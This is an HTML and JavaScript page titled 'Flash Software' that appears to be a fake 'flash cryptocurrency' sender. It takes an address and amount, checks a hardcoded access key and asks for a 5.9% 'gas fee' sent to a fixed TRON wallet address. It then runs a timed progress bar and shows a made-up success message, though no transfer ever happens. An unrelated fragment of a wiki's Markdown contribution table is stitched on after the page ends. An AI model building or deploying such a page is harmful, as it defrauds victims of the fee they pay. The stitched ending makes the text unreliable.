<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash Software</title>
    <style>
        /* General Styling */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        .container {
            background-color: #000; /* Black background for the container */
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            width: 700px;
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
        }

        h1 {
            color: yellow;
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 2px 2px #fff;
        }

        .form-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .form-group {
            flex: 1;
        }

        label {
            font-size: 1.2em;
            color: yellow;
            margin-bottom: 10px;
            display: block;
        }

        select, input[type="text"], input[type="number"], input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 1.1em;
            border-radius: 5px;
            border: 2px solid #fff; /* White border */
            margin-top: 10px;
            background-color: #fff; /* White input fields */
            color: black;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: yellow; /* Yellow button */
            color: black;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #fff; /* White on hover */
            color: black;
        }

        /* Popup Styling */
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
        }

        .popup-content {
            background-color: #000; /* Black background for popups */
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            color: yellow;
        }

        .popup button {
            background-color: yellow; /* Yellow popup buttons */
            color: black;
        }

        .popup button:hover {
            background-color: #fff; /* White hover */
            color: black;
        }

        /* Progress Bar Styling */
        #loading-popup {
            display: none;
        }

        .progress-container {
            width: 100%;
            background-color: #333;
            border-radius: 5px;
            margin: 20px 0;
        }

        .progress-bar {
            height: 20px;
            width: 0;
            background-color: yellow;
            border-radius: 5px;
            transition: width 0.5s;
        }

        .progress-text {
            margin-top: 10px;
            color: yellow;
        }

        /* Hash ID Popup Styling */
        #hash-id-popup {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Flash Software</h1>

        <div class="form-row">
            <div class="form-group">
                <label for="exchanger">Choose Exchanger</label>
                <select id="exchanger">
                    <option value="Binance">Binance</option>
                    <option value="Trust Wallet">Trust Wallet</option>
                    <option value="Coinbase">Coinbase</option>
                </select>
            </div>

            <div class="form-group">
                <label for="coin">Choose Coin</label>
                <select id="coin">
                    <option value="USDT">USDT</option>
                    <option value="USDC">USDC</option>
                    <option value="ETH">ETH</option>
                    <option value="BNB">BNB</option>
                    <option value="Bitcoin">Bitcoin</option>
                </select>
            </div>

            <div class="form-group">
                <label for="network">Choose Network</label>
                <select id="network">
                    <option value="TRC20">TRC20</option>
                    <option value="BTC">BTC</option>
                    <option value="BEP20">BEP20</option>
                    <option value="ERC20">ERC20</option>
                </select>
            </div>
        </div>

        <div class="form-row">
            <div class="form-group">
                <label for="address">Enter your network address</label>
                <input type="text" id="address">
            </div>
            <div class="form-group">
                <label for="amount">Enter amount</label>
                <input type="number" id="amount">
            </div>
        </div>

        <button id="proceed-btn">Proceed</button>
    </div>

    <!-- Access Key Popup -->
    <div class="popup" id="access-key-popup">
        <div class="popup-content">
            <h2>Enter 4-Digit Access Key</h2>
            <input type="password" id="access-key" maxlength="4">
            <button id="access-key-submit-btn">Submit</button>
        </div>
    </div>

    <!-- Gas Fee Popup -->
    <div class="popup" id="gas-fee-popup">
        <div class="popup-content">
            <h2>To access flash cryptocurrency, you need a gas fee of 5.9%</h2>
            <p>Copy this wallet to pay: <br> TEMmixVf9Y2WmFH735G5NSEhRurRhqpqVa</p>
            <button id="copy-wallet-btn">Copy Wallet Address</button>
            <button id="continue-btn">Continue</button>
        </div>
    </div>

    <!-- Hash ID Popup -->
    <div class="popup" id="hash-id-popup">
        <div class="popup-content">
            <h2>Enter Transaction Hash ID</h2>
            <input type="text" id="hash-id">
            <button id="hash-id-submit-btn">Submit</button>
        </div>
    </div>

    <!-- Loading Popup -->
    <div class="popup" id="loading-popup">
        <div class="popup-content">
            <h2>Processing...</h2>
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            <div class="progress-text" id="progress-percent">0%</div>
        </div>
    </div>

    <!-- Success Popup -->
    <div class="popup" id="success-popup">
        <div class="popup-content">
            <h2 id="success-message"></h2>
            <button id="success-ok-btn">OK</button>
        </div>
    </div>

    <!-- Final Message Popup -->
    <div class="popup" id="final-message-popup">
        <div class="popup-content">
            <h2>Flash will take 15 to 20 minutes to deliver</h2>
            <button id="final-ok-btn">OK</button>
        </div>
    </div>

    <script>
        document.getElementById('proceed-btn').addEventListener('click', function() {
            const address = document.getElementById('address').value;
            const amount = document.getElementById('amount').value;
            const exchanger = document.getElementById('exchanger').value;
            const coin = document.getElementById('coin').value;
            const network = document.getElementById('network').value;

            if (!address || !amount || !exchanger || !coin || !network) {
                alert('Please fill in all fields.');
                return;
            }

            document.getElementById('access-key-popup').style.display = 'flex';
        });

        document.getElementById('access-key-submit-btn').addEventListener('click', function() {
            const accessKey = document.getElementById('access-key').value;

            if (accessKey !== '0916') {
                alert('Invalid access key.');
                return;
            }

            document.getElementById('access-key-popup').style.display = 'none';
            document.getElementById('gas-fee-popup').style.display = 'flex';
        });

        document.getElementById('copy-wallet-btn').addEventListener('click', function() {
                        navigator.clipboard.writeText('TEMmixVf9Y2WmFH735G5NSEhRurRhqpqVa')
                .then(() => alert('Wallet address copied to clipboard'))
                .catch(err => alert('Failed to copy wallet address'));
        });

        document.getElementById('continue-btn').addEventListener('click', function() {
            document.getElementById('gas-fee-popup').style.display = 'none';
            document.getElementById('hash-id-popup').style.display = 'flex';
        });

        document.getElementById('hash-id-submit-btn').addEventListener('click', function() {
            const hashID = document.getElementById('hash-id').value;

            if (!hashID) {
                alert('Please enter a valid Hash ID.');
                return;
            }

            document.getElementById('hash-id-popup').style.display = 'none';
            document.getElementById('loading-popup').style.display = 'flex';

            let progress = 0;
            const progressBar = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-percent');

            const interval = setInterval(() => {
                progress += 1;
                progressBar.style.width = progress + '%';
                progressText.textContent = progress + '%';

                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        document.getElementById('loading-popup').style.display = 'none';
                        const amount = document.getElementById('amount').value;
                        const exchanger = document.getElementById('exchanger').value;
                        const coin = document.getElementById('coin').value;
                        const network = document.getElementById('network').value;

                        document.getElementById('success-message').textContent = ` ${amount} ${coin} ${network} flash transaction to ${exchanger}  is successful.`;
                        document.getElementById('success-popup').style.display = 'flex';
                    }, 1000); // Wait 1 second before showing the success popup
                }
            }, 400); // Update progress every 400ms
        });

        document.getElementById('success-ok-btn').addEventListener('click', function() {
            document.getElementById('success-popup').style.display = 'none';
            document.getElementById('final-message-popup').style.display = 'flex';
        });

        document.getElementById('final-ok-btn').addEventListener('click', function() {
            document.getElementById('final-message-popup').style.display = 'none';
        });
    </script>
</body>
</html>
------------------------------------------- |
| Improve or add articles to the wiki      | Head over to [this README](./SYNTAX.md) to understand the syntax of the wiki.        |
| Bring improvements to the wiki interface | Head over to [this README](./CONTRIBUTE.md) to understand how this repository works. |